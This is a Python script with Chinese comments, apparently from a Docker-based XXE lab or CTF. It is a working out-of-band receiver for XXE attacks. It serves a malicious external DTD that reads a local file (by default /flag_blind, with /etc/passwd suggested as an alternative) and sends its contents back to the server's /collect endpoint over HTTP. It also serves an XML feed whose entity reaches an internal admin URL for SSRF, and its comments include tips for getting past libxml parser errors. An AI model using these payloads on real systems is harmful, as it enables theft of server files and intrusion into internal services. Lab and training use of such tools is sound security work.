#!/usr/bin/env python3
"""
XXE 外带接收端（纯标准库，不需要 requests / flask）

它同时干三件事：
  /evil.dtd   —— L2 盲打用的「恶意外部 DTD」：读 /flag，再把内容拼进 URL 请求回来
  /feed.xml   —— L4 用的「远程数据源」：里面的实体指向内网服务
  /collect    —— 接收外带数据，打印在终端

用法：
    python3 poc/oob_server.py            # 监听 0.0.0.0:9999

容器怎么找到宿主机：
    容器的视角里，宿主机叫 host.docker.internal（Docker Desktop 自带这个解析）。
    所以要绑 0.0.0.0 而不是 127.0.0.1，否则容器连不进来。
"""

import os
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

OOB_HOST = os.environ.get("OOB_HOST", "host.docker.internal")
OOB_PORT = int(os.environ.get("OOB_PORT", "9999"))
INTERNAL = os.environ.get("INTERNAL_URL", "http://internal/admin.php")


class Handler(BaseHTTPRequestHandler):
    # 终端日志里少点噪音
    def log_message(self, fmt, *args):
        pass

    def _send(self, body, ctype="text/plain; charset=utf-8"):
        raw = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        path = urlparse(self.path).path
        query = parse_qs(urlparse(self.path).query)

        if path == "/evil.dtd":
            # 盲打的核心：DTD 里先读文件，再定义一个「SYSTEM 里带 %file;」的实体
            # &#x25; 就是 %，不能在声明里直接写 % 否则解析器会当成参数实体引用
            # ?f= 可以换目标文件，调试时用得上（比如改成 file:///etc/passwd）
            # 默认指向 /flag_blind：它的内容不含 {}，否则 libxml 会判定 URI 非法、请求发不出去
            target = query.get("f", ["file:///flag_blind"])[0]
            dtd = (
                f'<!ENTITY % file SYSTEM "{target}">\n'
                '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
                f"'http://{OOB_HOST}:{OOB_PORT}/collect?d=%file;'>\">\n"
                "%eval;\n"
                "%exfil;\n"
            )
            print(f"[dtd]   {self.client_address[0]} 取走了 evil.dtd")
            self._send(dtd, "application/xml-dtd; charset=utf-8")
            return

        if path == "/feed.xml":
            # L4 的数据源：文件本身是合法 XML，实体指向内网
            feed = (
                '<?xml version="1.0"?>\n'
                f'<!DOCTYPE r [<!ENTITY ssrf SYSTEM "{INTERNAL}">]>\n'
                "<r>&ssrf;</r>\n"
            )
            print(f"[feed]  {self.client_address[0]} 取走了 feed.xml")
            self._send(feed, "application/xml; charset=utf-8")
            return

        if path == "/collect":
            data = query.get("d", [""])[0]
            print(f"[外带]  {self.client_address[0]}  ->  {data!r}")
            # 回空体：libxml 会把这个响应当作实体的内容继续解析，
            # 回 "ok" 这种非 DTD 文本会报 "error detected in Markup declaration"，让整个解析失败
            self._send("")
            return

        print(f"[杂项]  {self.client_address[0]}  {self.path}")
        self._send("oob server: /evil.dtd  /feed.xml  /collect?d=...")


def main():
    srv = ThreadingHTTPServer(("0.0.0.0", OOB_PORT), Handler)
    print(f"OOB 服务器起来了：http://0.0.0.0:{OOB_PORT}")
    print(f"  容器里访问它用：http://{OOB_HOST}:{OOB_PORT}")
    print(f"  L2: {OOB_HOST}:{OOB_PORT}/evil.dtd   (默认读 /flag_blind)")
    print(f"  L4: {OOB_HOST}:{OOB_PORT}/feed.xml  (实体指向 {INTERNAL})")
    print("Ctrl-C 退出\n")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n已停止")
        srv.server_close()
        sys.exit(0)


if __name__ == "__main__":
    main()
